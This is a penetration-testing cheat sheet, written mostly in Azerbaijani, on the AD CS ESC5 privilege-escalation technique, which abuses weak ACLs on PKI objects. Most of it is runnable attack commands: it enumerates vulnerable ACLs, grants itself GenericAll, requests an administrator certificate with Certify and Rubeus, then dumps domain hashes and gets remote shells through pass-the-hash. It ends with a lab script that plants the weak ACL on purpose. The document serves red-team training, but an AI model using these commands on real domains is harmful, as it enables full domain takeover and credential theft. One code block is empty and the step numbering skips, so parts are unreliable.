# ESC5 — PKI Object Misconfigured Access Control

---

## ESC5 Nədir?

ESC5, sertifikat şablonlarının özü deyil, **AD CS infrastrukturunun əsas PKI
obyektlərinin** (CA serveri, Enrollment Services konteyner, NTAuthCertificates,
AIA/CDP obyektləri və s.) ACL-inin səhv konfiqurasiyasına əsaslanır.

Aşağı imtiyazlı istifadəçi bu obyektlər üzərində `WriteProperty`, `WriteDACL`,
`WriteOwner` və ya `GenericWrite` kimi icazələrə malik olduqda, CA davranışını,
güvən zəncirini və ya enrollment prosesini elə dəyişə bilər ki, özü üçün
ixtiyari istifadəçi adına sertifikat ala bilsin.

Bir sözlə: **şablon deyil, CA-nın özünü və ya PKI infrastrukturunu** hədəf alır.

---

## Lazımi Şərtlər

```
Zəif ACL (PKI obyektlərindən birində):
  CA Server AD obyekti        — pKIEnrollmentService
  NTAuthCertificates          — CA sertifikatları buraya yazılır
  Enrollment Services         — CN=Enrollment Services konteyner
  AIA / CDP konteyneri        — sertifikat yayımı
  Root CA obyekti             — CN=Certification Authorities

İcazə növləri:
  WriteProperty / GenericWrite / GenericAll / WriteDACL / WriteOwner

İstifadəçi:
  Domain Users, Authenticated Users və ya hər hansı geniş qrup

Hədəf:
  CA-nın idarə etdiyi bütün şablonlar üzərindən sertifikat alma
```

### Kritik ACL Hüquqları

```powershell
GenericAll        -    Tam nəzarət (CA obyektini istənilən şəkildə dəyişdirir)
GenericWrite      -    Xüsusiyyətləri dəyişdirir (cACertificate, flags, v.s.)
WriteProperty     -    Xüsusi atributları dəyişdirir
WriteDACL         -    ACL-i dəyişdirir → özünə GenericAll verir
WriteOwner        -    Owner-i dəyişdirir → sonra WriteDACL/GenericAll alır
```

### ESC5 Hədəf Obyektlər

```
CN=<CA-Name>,CN=Enrollment Services,CN=Public Key Services,
    CN=Services,CN=Configuration,DC=domain,DC=local
    → pKIEnrollmentService — aktiv CA enrollment nöqtəsi

CN=NTAuthCertificates,CN=Public Key Services,
    CN=Services,CN=Configuration,DC=domain,DC=local
    → CA sertifikatlarının güvən mağazası

CN=Certification Authorities,CN=Public Key Services,
    CN=Services,CN=Configuration,DC=domain,DC=local
    → Root CA obyektləri

CN=AIA,CN=Public Key Services,
    CN=Services,CN=Configuration,DC=domain,DC=local
    → Authority Information Access konteyner

CN=<CA-Name>,CN=CDP,...
    → CRL Distribution Point konteyner
```

---

## ESC5 Enumeration

```powershell
# Certipy — PKI obyektlərindəki zəif ACL-ləri aşkar edir
certipy-ad find -u 'test@certificate.local' -p 'sako2005!' \
    -dc-ip 192.168.0.150 \
    -ldap-scheme ldap \
    -stdout

# Certify.exe
Certify.exe find /vulnerable
Certify.exe cas
```

---

## ESC5 Enumeration With LDAP

```powershell
# Enrollment Services konteynerinin ACL-ini yoxla
ldapsearch -x -H ldap://dc.domain.local \
  -D "user@domain.local" -w 'Password123' \
  -b "CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local" \
  "(objectClass=*)" \
  name nTSecurityDescriptor objectClass

# PowerShell — PKI konteyner ACL-ini oxu
$configNC = (Get-ADRootDSE).configurationNamingContext
$pkiBase  = "CN=Public Key Services,CN=Services,$configNC"

# Enrollment Services ACL
$enrollPath = "AD:\CN=Enrollment Services,$pkiBase"
(Get-Acl $enrollPath).Access |
    Where-Object { $_.ActiveDirectoryRights -match "Write|GenericAll" } |
    Format-Table IdentityReference, ActiveDirectoryRights, AccessControlType

# NTAuthCertificates ACL
$ntauthPath = "AD:\CN=NTAuthCertificates,$pkiBase"
(Get-Acl $ntauthPath).Access |
    Where-Object { $_.ActiveDirectoryRights -match "Write|GenericAll" } |
    Format-Table IdentityReference, ActiveDirectoryRights, AccessControlType

# CA Server AD obyektinin ACL-i
$caPath = "AD:\CN=<CA-Name>,CN=Enrollment Services,$pkiBase"
(Get-Acl $caPath).Access |
    Format-Table IdentityReference, ActiveDirectoryRights, AccessControlType
```

---

## ESC5 Exploitation with Certipy

```powershell

```

---

## ESC5 Exploitation With PowerShell (Manual)

```powershell
# Ssenari A: Enrollment Services obyekti üzərində WriteDACL var
#            → özünə GenericAll ver → CA şablonlarını idarə et

# Step 1 — Enrollment Services ACL-ini yoxla
$configNC  = (Get-ADRootDSE).configurationNamingContext
$pkiBase   = "CN=Public Key Services,CN=Services,$configNC"
$enrollDN  = "CN=<CA-Name>,CN=Enrollment Services,$pkiBase"
(Get-Acl "AD:\$enrollDN").Access | Format-Table IdentityReference, ActiveDirectoryRights

# Step 2 — Özünə GenericAll ver (WriteDACL varsa)
$acl      = Get-Acl "AD:\$enrollDN"
$identity = [System.Security.Principal.NTAccount]"DOMAIN\lowuser"
$adRights = [System.DirectoryServices.ActiveDirectoryRights]::GenericAll
$type     = [System.Security.AccessControl.AccessControlType]::Allow
$rule     = New-Object System.DirectoryServices.ActiveDirectoryAccessRule($identity, $adRights, $type)
$acl.AddAccessRule($rule)
Set-Acl -Path "AD:\$enrollDN" -AclObject $acl

# Step 3 — CA-nın certificateTemplates atributuna vulnerable şablon əlavə et
Set-ADObject $enrollDN -Add @{
    "certificateTemplates" = "VulnerableTemplate"
}

# Ssenari B: NTAuthCertificates üzərində WriteProperty var
#            → CA sertifikatını güvən mağazasına yaz → fake CA qurula bilər

# Step 1 — NTAuthCertificates-ə CA sertifikatını yaz
$ntauthDN = "CN=NTAuthCertificates,$pkiBase"
$caCert   = [System.Convert]::ToBase64String(
    (Get-Item Cert:\LocalMachine\CA\<Thumbprint>).RawData
)
Set-ADObject $ntauthDN -Add @{
    "cACertificate" = $caCert
}

# Step 4 — SAN ilə sertifikat al
Certify.exe request /ca:"CA-Server\CA-Name" \
    /template:"VulnerableTemplate" \
    /altname:"administrator"
```

---

## ESC5 Exploitation With Certify and Rubeus

```powershell
# Step 1 — PKI obyektini modifikasiya et (PowerShell ilə yuxarıdakı addımları icra et)

# Step 2 — Administrator adına SAN ilə sertifikat al
Certify.exe request /ca:"CA-Server\CA-Name" \
    /template:"VulnerableTemplate" \
    /altname:"administrator"

# Convert PEM → PFX (Linux)
openssl pkcs12 -in admin_cert.pem \
    -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" \
    -export -out admin.pfx

# Step 3 — TGT al
Rubeus.exe asktgt /user:administrator \
    /certificate:admin.pfx \
    /password:'' /ptt

# Yoxla
klist
whoami /all
```

---

## Post Exploitation

```powershell
# SMB with NT Hash
impacket-psexec  -hashes ':NTHash' administrator@dc.domain.local
impacket-smbexec -hashes ':NTHash' administrator@dc.domain.local
impacket-wmiexec -hashes ':NTHash' administrator@dc.domain.local

# Dump all hashes
impacket-secretsdump -hashes ':NTHash' administrator@dc.domain.local

# CrackMapExec
crackmapexec smb 10.10.10.10 -u administrator -H NTHash --shares
crackmapexec smb 10.10.10.10 -u administrator -H NTHash -x "whoami"

# Evil-WinRM
evil-winrm -i 10.10.10.10 -u administrator -H NTHash
```

---

## Laboratory

```powershell
#Requires -RunAsAdministrator
<#
.SYNOPSIS
    ESC5 Vulnerable Lab Setup Script
    Creates weak ACLs in the PKI infrastructure:
      WriteProperty + WriteDACL permissions are granted to Domain Users
      on the Enrollment Services object.

.DESCRIPTION
    The CA's own AD object is targeted, not a certificate template.
    A low-privileged user can modify the CA enrollment service to
    attach any template to the CA or change CA behavior.

    Exploit chain (correct order):
      1. Use WriteDACL to grant yourself GenericAll on the Enrollment Services object
      2. With GenericAll, obtain WriteProperty on the template itself
      3. Use certipy template to convert the template to ESC1
      4. Use certipy req to obtain a certificate via SAN
      5. Use certipy auth to authenticate

    If permissions are insufficient, run as SYSTEM:
        PsExec64.exe -s -i powershell.exe .\Setup-ESC5Lab.ps1

.NOTES
    For authorized lab/testing use only.
#>

# -- Config -------------------------------------------------------------------

$WriteGroup = "Domain Users"   # WriteProperty/WriteDACL will be granted to this group

# -- Helpers ------------------------------------------------------------------

function Write-Step { param($msg) Write-Host "[*] $msg" -ForegroundColor Cyan }
function Write-Ok   { param($msg) Write-Host "[+] $msg" -ForegroundColor Green }
function Write-Fail { param($msg) Write-Host "[-] $msg" -ForegroundColor Red }
function Write-Warn { param($msg) Write-Host "[!] $msg" -ForegroundColor Yellow }

# -- Preflight ----------------------------------------------------------------

Write-Host ""
Write-Host "  ESC5 Lab Setup" -ForegroundColor Magenta
Write-Host "  --------------------------------------" -ForegroundColor DarkGray
Write-Host ""

Write-Step "Checking environment..."

try {
    $configNC = (Get-ADRootDSE).configurationNamingContext
    $pkiBase  = "CN=Public Key Services,CN=Services,$configNC"
    Write-Ok "Config NC: $configNC"
} catch {
    Write-Fail "Cannot reach AD. Is this a Domain Controller?"
    exit 1
}

# -- Find CA Name -------------------------------------------------------------

Write-Step "Detecting CA name from Enrollment Services..."

try {
    $enrollBase = "CN=Enrollment Services,$pkiBase"
    $caObj = Get-ADObject -Filter * -SearchBase $enrollBase `
                -SearchScope OneLevel `
                -Properties Name -ErrorAction Stop |
             Select-Object -First 1

    if (-not $caObj) {
        Write-Fail "No CA found under Enrollment Services. Is ADCS installed?"
        exit 1
    }

    $caName   = $caObj.Name
    $enrollDN = "CN=$caName,$enrollBase"
    Write-Ok "CA found: $caName"
    Write-Ok "Enrollment Services DN: $enrollDN"
} catch {
    Write-Fail "Could not enumerate Enrollment Services: $_"
    exit 1
}

# -- Grant WriteProperty + WriteDACL to Domain Users on Enrollment Services ---

Write-Step "Granting WriteProperty + WriteDACL to '$WriteGroup' on Enrollment Services (ESC5 misconfiguration)..."

try {
    $acl      = Get-Acl "AD:\$enrollDN"
    $identity = [System.Security.Principal.NTAccount]$WriteGroup

    $ruleWrite = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
        $identity,
        [System.DirectoryServices.ActiveDirectoryRights]::WriteProperty,
        [System.Security.AccessControl.AccessControlType]::Allow
    )
    $ruleDACL = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
        $identity,
        [System.DirectoryServices.ActiveDirectoryRights]::WriteDacl,
        [System.Security.AccessControl.AccessControlType]::Allow
    )

    $acl.AddAccessRule($ruleWrite)
    $acl.AddAccessRule($ruleDACL)
    Set-Acl -Path "AD:\$enrollDN" -AclObject $acl -ErrorAction Stop
    Write-Ok "WriteProperty + WriteDACL granted to '$WriteGroup' on '$enrollDN'."
} catch {
    Write-Fail "Failed to set ACL on Enrollment Services: $_"
    Write-Warn "Run as SYSTEM: PsExec64.exe -s -i powershell.exe .\Setup-ESC5Lab.ps1"
    exit 1
}

# -- Verify -------------------------------------------------------------------

Write-Step "Verifying ACL..."
$acl = Get-Acl "AD:\$enrollDN"
$vulnerable = $acl.Access |
    Where-Object {
        $_.IdentityReference -match $WriteGroup -and
        $_.ActiveDirectoryRights -match "WriteProperty|WriteDacl"
    }

if ($vulnerable) {
    Write-Ok "Verification passed -- vulnerable ACE confirmed."
} else {
    Write-Warn "Verification inconclusive -- check ACL manually."
}

# -- Summary ------------------------------------------------------------------

$domain = (Get-ADDomain).DNSRoot
$dcIP   = (Resolve-DnsName $domain -Type A -ErrorAction SilentlyContinue |
           Select-Object -First 1).IPAddress

Write-Host ""
Write-Host "  --------------------------------------" -ForegroundColor DarkGray
Write-Host "  ESC5 Lab Ready" -ForegroundColor Green
Write-Host "  --------------------------------------" -ForegroundColor DarkGray
Write-Host ""
Write-Host "  Target Object : $enrollDN" -ForegroundColor White
Write-Host "    Vuln ACL    : WriteProperty + WriteDACL -> Domain Users" -ForegroundColor White
Write-Host ""
Write-Host "  -- Exploit Chain --------------------------------------------" -ForegroundColor DarkGray
Write-Host ""
Write-Host "  # Step 1 -- Discover current state" -ForegroundColor DarkGray
Write-Host "  certipy find -u lowuser@$domain -p PASSWORD -dc-ip $dcIP -stdout" -ForegroundColor Cyan
Write-Host ""
Write-Host "  # Step 2 -- Use WriteDACL to grant yourself GenericAll on Enrollment Services" -ForegroundColor DarkGray
Write-Host "  # (Without this step, certipy template cannot reach the template)" -ForegroundColor DarkGray
Write-Host "  dacledit.py -action write -rights FullControl -principal lowuser -target-dn '$enrollDN' -dc-ip $dcIP DOMAIN/lowuser:PASSWORD" -ForegroundColor Cyan
Write-Host ""
Write-Host "  # Step 3 -- Back up the target template and convert it to ESC1" -ForegroundColor DarkGray
Write-Host "  certipy template -u lowuser@$domain -p PASSWORD -dc-ip $dcIP -template User -save-old" -ForegroundColor Cyan
Write-Host ""
Write-Host "  # Step 4 -- Request a certificate with SAN as Administrator" -ForegroundColor DarkGray
Write-Host "  certipy req -u lowuser@$domain -p PASSWORD -dc-ip $dcIP -target $dcIP -ca '$caName' -template User -upn administrator@$domain" -ForegroundColor Cyan
Write-Host ""
Write-Host "  # Step 5 -- Authenticate" -ForegroundColor DarkGray
Write-Host "  certipy auth -pfx administrator.pfx -dc-ip $dcIP" -ForegroundColor Cyan
Write-Host ""
Write-Host "  # Step 6 -- Restore the template (optional)" -ForegroundColor DarkGray
Write-Host "  certipy template -u lowuser@$domain -p PASSWORD -dc-ip $dcIP -template User -configuration User.json" -ForegroundColor Cyan
Write-Host ""
```
